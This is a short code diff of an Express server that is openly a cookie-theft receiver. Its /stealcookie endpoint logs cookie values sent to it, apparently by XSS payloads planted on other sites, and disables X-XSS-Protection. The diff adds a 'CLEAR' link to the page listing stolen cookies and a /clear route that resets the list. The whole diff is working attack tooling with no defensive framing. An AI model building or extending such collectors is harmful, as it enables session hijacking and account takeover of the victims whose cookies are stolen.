@@ -12,7 +12,7 @@ app.get('/', (req, res) => {
 //View stole cookies
 app.get('/cookies', (req, res) => {
     console.log(cookies)
-    res.send(cookies);
+    res.send('<a href="/clear">CLEAR</a><br><br>' + cookies);
 })
 
 //Stole cookie 
@@ -20,6 +20,11 @@ app.get('/stealcookie', (req, res) => {
     res.setHeader('X-XSS-Protection', '0')
     cookies += req.query.c.replace("<", "&lt;").replace(">", "&gt;") + "<br><br>----------------------------------------------<br><br>";
     res.send('https://i.kym-cdn.com/photos/images/original/000/869/487/ccf.png');
+})
+
+app.get('/clear', (req, res) => {
+    cookies = '';
+    res.redirect('/cookies');
 })
 
 app.listen(port, () => console.log(`Example app listening on port ${port}!`))
